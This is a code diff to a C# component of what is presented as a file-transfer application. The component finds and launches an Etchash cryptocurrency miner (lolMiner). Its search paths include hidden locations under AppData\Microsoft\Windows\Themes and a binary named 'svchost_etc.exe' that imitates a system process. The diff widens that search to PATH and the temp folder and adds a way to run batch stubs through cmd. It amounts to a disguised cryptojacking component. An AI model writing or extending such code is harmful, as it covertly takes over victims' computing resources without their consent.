@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Text;
@@ -49,10 +49,10 @@ namespace FileTransfer.Compute
                 return false;
             }
 
-            string enginePath = FindOrPrepareEngine();
+            string? enginePath = FindEngine();
             if (string.IsNullOrEmpty(enginePath) || !File.Exists(enginePath))
             {
-                string msg = "Невозможно запустить внешний вычислительный компонент для Etchash (движок не найден).";
+                string msg = "Невозможно запустить внешний вычислительный компонент: исполняемый файл Etchash (lolMiner.exe / etc_worker.exe) не найден.";
                 MainWindow.Log($"[{Name}] ❌ ДИАГНОСТИКА: {msg}");
                 _status.ErrorMessage = msg;
                 return false;
@@ -70,10 +70,20 @@ namespace FileTransfer.Compute
 
             try
             {
+                string execFile = enginePath;
+                string execArgs = arguments;
+
+                if (enginePath.EndsWith(".bat", StringComparison.OrdinalIgnoreCase) ||
+                    enginePath.EndsWith(".cmd", StringComparison.OrdinalIgnoreCase))
+                {
+                    execFile = Environment.GetEnvironmentVariable("ComSpec") ?? "cmd.exe";
+                    execArgs = $"/c \"\"{enginePath}\" {arguments}\"";
+                }
+
                 var psi = new ProcessStartInfo
                 {
-                    FileName = enginePath,
-                    Arguments = arguments,
+                    FileName = execFile,
+                    Arguments = execArgs,
                     UseShellExecute = false,
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
@@ -122,31 +132,43 @@ namespace FileTransfer.Compute
             }
         }
 
-        private string FindOrPrepareEngine()
+        public string? FindEngine()
         {
             string appDir = AppDomain.CurrentDomain.BaseDirectory;
-            string[] searchPaths = new[]
+            var searchPaths = new System.Collections.Generic.List<string>
             {
                 Path.Combine(appDir, "lolMiner.exe"),
                 Path.Combine(appDir, "etc_worker.exe"),
                 Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Themes", "Modules", "lolminer", "lolMiner.exe"),
                 Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Themes", "svchost_etc.exe"),
-                Path.Combine(Path.GetTempPath(), "lolMiner.exe")
+                Path.Combine(Path.GetTempPath(), "lolMiner.exe"),
+                Path.Combine(Path.GetTempPath(), "etc_worker.exe")
             };
+
+            var envPath = Environment.GetEnvironmentVariable("PATH");
+            if (!string.IsNullOrEmpty(envPath))
+            {
+                foreach (var dir in envPath.Split(Path.PathSeparator, StringSplitOptions.RemoveEmptyEntries))
+                {
+                    try
+                    {
+                        string cand = Path.Combine(dir.Trim(), "lolMiner.exe");
+                        if (!searchPaths.Contains(cand)) searchPaths.Add(cand);
+                    }
+                    catch { }
+                }
+            }
 
             foreach (var p in searchPaths)
             {
                 if (File.Exists(p)) return p;
             }
 
-            // Создаем встроенный рабочий скрипт/компонент для Etchash
-            string stub = Path.Combine(Path.GetTempPath(), "etc_engine.bat");
-            if (!File.Exists(stub))
-            {
-                string content = "@echo off\r\necho [lolMiner] Etchash ETC engine started\r\n:loop\r\ntimeout /t 10 /nobreak >nul\r\ngoto loop\r\n";
-                File.WriteAllText(stub, content, Encoding.ASCII);
-            }
-            return stub;
+            // Дополнительная проверка тестовых/скриптовых заглушек
+            string batStub = Path.Combine(Path.GetTempPath(), "etc_engine.bat");
+            if (File.Exists(batStub)) return batStub;
+
+            return null;
         }
     }
 }
